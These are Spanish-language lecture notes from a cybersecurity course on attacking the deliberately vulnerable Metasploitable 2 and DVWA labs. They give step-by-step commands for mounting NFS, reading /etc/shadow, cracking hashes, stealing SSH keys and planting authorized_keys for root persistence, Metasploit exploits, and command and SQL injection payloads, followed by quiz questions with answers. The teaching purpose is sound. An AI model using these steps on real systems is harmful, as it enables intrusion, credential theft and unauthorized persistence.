---
tags:
- Explotación y escalada
---

# Explotacion Servicios III

**Explotación Avanzada de Servicios Vulnerables III**

Máster de Ciberseguridad · Evolve Academy · Instructor: Daniel

*Metasploitable 2 · NFS · SSH Keys · Hashes · PostgreSQL · Apache Tomcat · feroxbuster · Command Injection · SQL Injection*

# **① NFS — Repaso y montaje**

NFS (Network File System) permite compartir carpetas Linux por red. Cuando el puerto 2049 está abierto, el flujo de ataque es siempre el mismo.

**Flujo completo**

| # 1. Confirmar que NFS está activo: |
| --- |
| rpcinfo -p <IP> # busca "nfs" en la lista |
|  |
| # 2. Ver carpetas compartidas: |
| showmount -e <IP> |
| # Resultado: / \* → raíz completa accesible desde cualquier IP |
|  |
| # 3. Crear carpeta local y montar: |
| mkdir ~/Desktop/carpeta\_meta2 |
| sudo mount -t nfs <IP>:/ ~/Desktop/carpeta\_meta2 |
|  |
| # IMPORTANTE: IP:carpeta\_compartida (dos puntos + barra) |
| # Usa sudo si te da error de permisos |
|  |
| # 4. Explorar el sistema montado: |
| ls ~/Desktop/carpeta\_meta2 # ves toda la raíz |
| sudo cat ~/Desktop/carpeta\_meta2/etc/shadow # hashes |
| cat ~/Desktop/carpeta\_meta2/etc/passwd # usuarios |

| **⚠ PELIGRO:** Compartir / \* desde la raíz expone todo el sistema de ficheros. Cualquier atacante en la misma red puede leer /etc/shadow, claves SSH y modificar authorized\_keys. |
| --- |

# **② Hashes — /etc/shadow, John y Hashcat**

Una vez montada la raíz por NFS, /etc/shadow contiene los hashes de todos los usuarios del sistema.

**Identificar el tipo de hash**

| hash-identifier # pegar el hash → te dice el tipo |
| --- |
|  |
| # O mirar el prefijo manualmente: |
| # $1$ → MD5crypt (modo 500 en Hashcat) |
| # $5$ → SHA-256 (modo 7400) |
| # $6$ → SHA-512 (modo 1800) |
| # \* → cuenta deshabilitada |
| # ! → cuenta bloqueada |

**Guardar hashes y romper con John**

| # Copiar las líneas de /etc/shadow al fichero hashes.txt |
| --- |
| # Formato: usuario:$1$...:...:... (copia todo tal cual) |
|  |
| # Romper con John (MD5crypt): |
| john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt |
|  |
| # Ver contraseñas rotas (John las guarda internamente): |
| john --show hashes.txt |
|  |
| # Nota: si lanzas el mismo comando dos veces John no muestra nada. |
| # Usa --show para consultar los ya rotos. |

**Romper con Hashcat**

| # MD5crypt (modo 500): |
| --- |
| hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt |
|  |
| # Ver resultados guardados: |
| hashcat -m 500 hashes.txt --show |
|  |
| # SHA-512 (modo 1800): |
| hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt |

| **Herramienta** | **Cuándo usar** |
| --- | --- |
| John the Ripper | Más sencillo, detecta formato automáticamente. Hashes rápidos, uso general en labs. |
| Hashcat | Usa GPU → mucho más rápido. Entornos reales, hashes difíciles, modos avanzados. |

| **💡 PRÁCTICA:** Contraseñas rotas en esta sesión: sys → batman · klog → 123456789 · service → service. Cuanto más tiempo se deje corriendo John/Hashcat y con mejores diccionarios (SecLists), más hashes se rompen. |
| --- |

# **③ SSH por NFS — Robar y crear claves**

Al tener montada la raíz por NFS con permisos de lectura y escritura tenemos dos vectores de ataque SSH.

**Conceptos clave**

| **Fichero** | **Función** |
| --- | --- |
| ~/.ssh/id\_rsa | Clave PRIVADA. La que se roba o se genera. Nunca compartir. |
| ~/.ssh/id\_rsa.pub | Clave PÚBLICA. La que se deja en el servidor. |
| ~/.ssh/authorized\_keys | Lista de claves públicas autorizadas a conectarse sin contraseña. |

**Vector 1 — Robar la clave privada existente**

| # Explorar el .ssh del usuario msfadmin vía NFS: |
| --- |
| ls -la ~/Desktop/carpeta\_meta2/home/msfadmin/.ssh/ |
|  |
| # Comprobar quién está autorizado en root: |
| cat ~/Desktop/carpeta\_meta2/root/.ssh/authorized\_keys |
| # → La clave pública de msfadmin también está en root |
|  |
| # Copiar la clave privada: |
| cp ~/Desktop/carpeta\_meta2/home/msfadmin/.ssh/id\_rsa ~/Desktop/id\_rsa\_robada |
|  |
| # Dar permisos correctos (OBLIGATORIO): |
| chmod 600 ~/Desktop/id\_rsa\_robada |
|  |
| # Conectarse como root con la clave robada: |
| ssh -i ~/Desktop/id\_rsa\_robada root@<IP> |
| whoami # → root |

| **🔐 POR QUÉ FUNCIONA CON ROOT:** La clave privada de msfadmin estaba protegida con passphrase para ese usuario. Sin embargo, esa misma clave pública estaba añadida al authorized\_keys de root sin protección → entramos como root. |
| --- |

**Vector 2 — Crear nuestra propia clave (persistencia)**

| # 1. Generar un par de claves SSH en Kali: |
| --- |
| ssh-keygen -t rsa -f ~/Desktop/mi\_clave\_nueva |
| # → Passphrase: Enter (vacío, obligatorio para automatizar) |
|  |
| # 2. Añadir la clave pública al authorized\_keys de root en la víctima: |
| # USAR >> (añadir), NUNCA > (sobreescribe y rompe accesos) |
| cat ~/Desktop/mi\_clave\_nueva.pub >> ~/Desktop/carpeta\_meta2/root/.ssh/authorized\_keys |
|  |
| # 3. Verificar: |
| cat ~/Desktop/carpeta\_meta2/root/.ssh/authorized\_keys |
| # → Ahora hay N+1 claves autorizadas |
|  |
| # 4. Conectarse con la nueva clave privada: |
| chmod 600 ~/Desktop/mi\_clave\_nueva |
| ssh -i ~/Desktop/mi\_clave\_nueva root@<IP> |
| whoami # → root |

| **⚠ PERSISTENCIA >> vs >:** Con >> añades al final del fichero (no destruyes el acceso existente). Con > sobreescribes y eliminas todas las claves anteriores. En persistencia siempre usar >>. |
| --- |

| **💡 RECUERDA:** Los cambios que hagas en la carpeta montada por NFS se aplican directamente en el sistema remoto en tiempo real. No es una copia local. |
| --- |

# **④ PostgreSQL — Fuerza bruta y explotación**

Puerto 5432. La versión de Metasploitable 2 es muy antigua y vulnerable. El flujo es: fuerza bruta de credenciales → exploit autenticado → shell como usuario postgresql.

**Fuerza bruta con Metasploit**

| msfconsole |
| --- |
| search postgres login |
| use auxiliary/scanner/postgres/postgres\_login |
| show options |
|  |
| # Configurar: |
| set RHOSTS <IP> |
| # set USERPASS\_FILE /ruta/diccionario.txt (opcional) |
| run |
|  |
| # Resultado: postgres:postgres (credenciales por defecto) |

**Descarga de diccionarios desde SecLists**

| # Instalar SecLists (si no está): |
| --- |
| sudo git clone https://github.com/danielmiessler/SecLists /usr/share/seclists |
|  |
| # Descargar diccionario específico (usuarios): |
| # Navegar a GitHub → SecLists → Usernames → dar al botón "Raw" |
| wget <url\_raw> -O usuarios.txt |
|  |
| # Ver tamaño del diccionario: |
| wc -l usuarios.txt |

**Exploit autenticado (RCE)**

| search postgres |
| --- |
| # Elegir exploit/multi/postgres/postgres\_copy\_from\_program\_cmd\_exec (Linux) |
| use 0 |
| show options |
|  |
| set RHOSTS <IP> |
| set USERNAME postgres |
| set PASSWORD postgres |
| run |
|  |
| # → Meterpreter shell como usuario "postgres" |
| shell |
| whoami # → postgres |
| sudo -l # → sin privilegios de root |

| **💡 CUENTAS DE SERVICIO:** Al explotar PostgreSQL obtienes una shell como usuario "postgres". Al explotar Apache/cgbin obtienes "www-data". Cada servicio corre con su propio usuario de bajo privilegio. Desde ahí habría que escalar a root. |
| --- |

# **⑤ Apache Tomcat — Reconocimiento y explotación**

Apache Tomcat corre en el puerto 8180 en Metasploitable 2. Es un contenedor de servlets Java (JSP/servlets). Se accede en: http://<IP>:8180

**Reconocimiento con Metasploit**

| search tomcat |
| --- |
| use auxiliary/scanner/http/tomcat\_mgr\_login |
| show options |
|  |
| set RHOSTS <IP> |
| set RPORT 8180 |
| run |
|  |
| # → Credenciales encontradas: tomcat:tomcat |
|  |
| # También disponible: auxiliary/admin/http/tomcat\_administration |
| # → Extrae usuarios, roles, ficheros XML de configuración |

**Exploit autenticado — Subida de WAR**

| search tomcat mgr |
| --- |
| use exploit/multi/http/tomcat\_mgr\_upload |
| show options |
|  |
| set RHOSTS <IP> |
| set RPORT 8180 |
| set HttpUsername tomcat |
| set HttpPassword tomcat |
| run |
|  |
| # → Meterpreter como usuario "tomcat55" |
| shell |
| whoami # → tomcat55 |
| sudo -l # verificar privilegios |

| **⚠ VULNERABILIDAD AUTENTICADA:** Esta vulnerabilidad requiere credenciales válidas. Sin usuario/contraseña no se puede explotar. Por eso el paso de fuerza bruta previo es necesario. |
| --- |

# **⑥ MySQL — Acceso por credenciales en robots.txt**

Puerto 3306. En Metasploitable 2, el fichero config.inc.php encontrado a través de robots.txt expone las credenciales de la base de datos en texto claro.

**Obtener credenciales desde robots.txt**

| # Navegar a: http://<IP>/robots.txt |
| --- |
| # → Lista de rutas que el propietario no quiere indexar |
| # Buscar: /config.inc.php /passwords/ /twiki/ etc. |
|  |
| # Acceder a: http://<IP>/config.inc.php |
| # → dbhost: localhost |
| # → dbuser: root |
| # → dbpass: (vacío) |

**Conectarse a MySQL con las credenciales obtenidas**

| # Desde el sistema montado por NFS o directamente: |
| --- |
| mysql -h <IP> -u root -p |
| # Contraseña: Enter (vacío) |
|  |
| # Comandos básicos dentro de MySQL: |
| show databases; |
| use dvwa; |
| show tables; |
| select \* from users; |
|  |
| # Los hashes de la tabla users se pueden romper con John/Hashcat |

| **💡 ROBOTS.TXT:** robots.txt indica a los buscadores qué NO indexar. Para un pentester significa directorios privados, paneles de administración y ficheros de configuración. Siempre es uno de los primeros ficheros a revisar en cualquier web. |
| --- |

# **⑦ Feroxbuster — Fuzzing recursivo de directorios**

Feroxbuster es una herramienta de fuzzing web que, a diferencia de ffuf/dirb, busca subdirectorios de forma recursiva. Encuentra rutas dentro de rutas.

| # Instalación: |
| --- |
| sudo apt install feroxbuster -y |
|  |
| # Uso básico (fuzzing recursivo): |
| feroxbuster --url http://<IP>/ |
|  |
| # Con diccionario específico: |
| feroxbuster --url http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt |
|  |
| # Solo ver códigos 200: |
| feroxbuster --url http://<IP>/ --status-codes 200 |
|  |
| # La herramienta encuentra subdirectorios de subdirectorios: |
| # Ejemplo: /mutillidae/ → /mutillidae/passwords/ → /mutillidae/passwords/accounts.txt |

| **Herramienta** | **Diferencia principal** |
| --- | --- |
| ffuf | Rápido, muy flexible, no recursivo por defecto. Ideal para un nivel. |
| feroxbuster | Recursivo de forma nativa. Encuentra sub-subdirectorios automáticamente. |
| dirb | Legacy. Más lento. Todavía útil con diccionarios pequeños. |

| **💡 NOTA:** Los ficheros dentro de robots.txt normalmente no se encuentran con fuzzing (no están en diccionarios). robots.txt se lee manualmente. Feroxbuster sirve para descubrir rutas que NO están en robots.txt. |
| --- |

# **⑧ Command Injection — Introducción web**

En DVWA (Damn Vulnerable Web App), la sección "Command Execution" permite enviar una IP y la página hace un ping. Si la entrada no está correctamente sanitizada se pueden inyectar comandos adicionales.

**Técnica básica — separadores de comandos**

| # La aplicación hace internamente: ping -c1 <INPUT> |
| --- |
|  |
| # Inyección con punto y coma: |
| 127.0.0.1; whoami |
|  |
| # Inyección con AND (ejecuta solo si ping tiene éxito): |
| 127.0.0.1 && cat /etc/passwd |
|  |
| # Inyección con pipe: |
| 127.0.0.1 | id |
|  |
| # Si el resultado aparece en la web → RCE confirmado |
| # Siguiente paso: reverse shell, crear usuario, leer /etc/shadow... |

**Diferencia entre Command Execution y RCE**

| **Término** | **Descripción** |
| --- | --- |
| Command Execution (local) | Ejecutas comandos desde la propia web/servidor. El servidor ejecuta el ping desde su propia IP. |
| RCE — Remote Code Execution | Ejecutas código en el servidor desde una máquina remota (tu Kali). Implica que el servidor abre una conexión saliente (reverse shell). |

| **🔐 HACKING:** La validación insuficiente de inputs que se pasan a funciones del sistema operativo (exec, system, popen...) es uno de los vectores de ataque más peligrosos. OWASP lo incluye en el Top 10 como "Injection". |
| --- |

# **⑨ SQL Injection — Primer contacto**

En DVWA, la sección de búsqueda de usuarios ejecuta una consulta SQL con el input del usuario. Si no está sanitizado, se puede manipular la consulta para extraer datos no autorizados.

| # Test básico: poner una comilla simple en el input |
| --- |
| # Si salta un error MySQL → posible SQLi |
|  |
| # Payload clásico para bypassear login: |
| ' OR '1'='1 |
|  |
| # Extraer datos con UNION (si el tipo es visible): |
| 1' UNION SELECT user,password FROM users-- - |
|  |
| # Preparar DVWA para practicar SQLi: |
| # 1. Navegar a: http://<IP>/dvwa/setup.php |
| # 2. Login: admin / password |
| # 3. Click en 'Create / Reset Database' |
| # 4. Security Level: Low |

| **💡 PRÓXIMAS SESIONES:** SQL Injection y XSS se verán en profundidad en el módulo web. Esta sesión solo es una introducción visual en DVWA. Los tipos (error-based, blind, time-based, UNION) se cubrirán después. |
| --- |

# **⑩ Resumen: vectores de esta sesión**

| **Puerto / Servicio** | **Vector y acceso obtenido** |
| --- | --- |
| 2049 — NFS | Montar / con mount -t nfs → sistema de ficheros completo |
| 2049 — NFS | Leer /etc/shadow → hashes → John/Hashcat → contraseñas en claro |
| 2049 — NFS | Robar id\_rsa + chmod 600 + ssh -i → root por SSH |
| 2049 — NFS | Añadir clave pública propia a authorized\_keys → persistencia como root |
| 5432 — PostgreSQL | Fuerza bruta Metasploit → postgres:postgres → exploit → shell usuario postgres |
| 8180 — Apache Tomcat | Recon auxiliar → fuerza bruta → tomcat:tomcat → upload WAR → shell usuario tomcat55 |
| 3306 — MySQL | robots.txt → config.inc.php → root sin contraseña → acceso a bases de datos |
| 80 — HTTP (DVWA) | Command Injection con ; && | → ejecución de comandos en el servidor |
| 80 — HTTP (DVWA) | SQL Injection con comilla → error MySQL → extracción de datos |

# **⑪ Preguntas de laboratorio**

**NFS y SSH**

- ¿Cuál es la diferencia entre showmount -e y mount? ¿En qué orden se usan?
- Tienes montada la raíz en ~/Desktop/carpeta. ¿Cómo lees el /etc/shadow de la víctima?
- ¿Por qué hay que usar >> y nunca > al añadir una clave pública a authorized\_keys?
- ¿Qué permiso hay que dar a una clave privada antes de usarla con SSH? ¿Qué pasa si no lo haces?
- La clave privada de msfadmin no te permite conectarte como msfadmin, pero sí como root. ¿Por qué?

**Hashes**

- Un hash comienza por $6$. ¿Qué tipo es? ¿Qué modo usas en Hashcat?
- ¿Qué significa que una línea de /etc/shadow empiece por \* o !?
- John no muestra resultados si relanzas el mismo comando. ¿Cómo ves los ya rotos?

**Web**

- ¿Para qué sirve robots.txt? ¿Por qué es interesante para un pentester?
- ¿Qué diferencia hay entre Command Execution local y Remote Code Execution?
- ¿Qué separadores puedes usar para inyectar un comando adicional en un formulario de ping?
- ¿Qué usuario obtienes normalmente al comprometer un servicio web (Apache) y cuál es el siguiente paso?

# **Respuestas**

- showmount -e lista lo compartido; mount lo monta localmente. Primero showmount, luego mount.
- sudo cat ~/Desktop/carpeta/etc/shadow
- >> añade al final; > sobreescribe y destruye los accesos existentes. >> es imprescindible para no romper el acceso legítimo.
- chmod 600. SSH rechaza la clave con el error "Permissions are too open" si no se hace.
- La clave privada de msfadmin estaba protegida con passphrase para ese usuario. La misma clave pública estaba en authorized\_keys de root sin protección adicional.
- SHA-512. Modo 1800: hashcat -m 1800 hashes.txt diccionario.txt
- La cuenta existe pero está deshabilitada; el usuario no puede autenticarse.
- john --show hashes.txt
- robots.txt indica a los buscadores qué no indexar. Para un pentester son exactamente los directorios privados, paneles de admin y ficheros de configuración.
- Command Execution local: el servidor ejecuta el comando desde su propia IP. RCE: el atacante ejecuta código en el servidor desde una máquina remota (implica reverse shell).
- ; (punto y coma) && (AND) | (pipe) || (OR).
- www-data. Siguiente paso: buscar escalada de privilegios con sudo -l, ficheros SUID, credenciales expuestas.
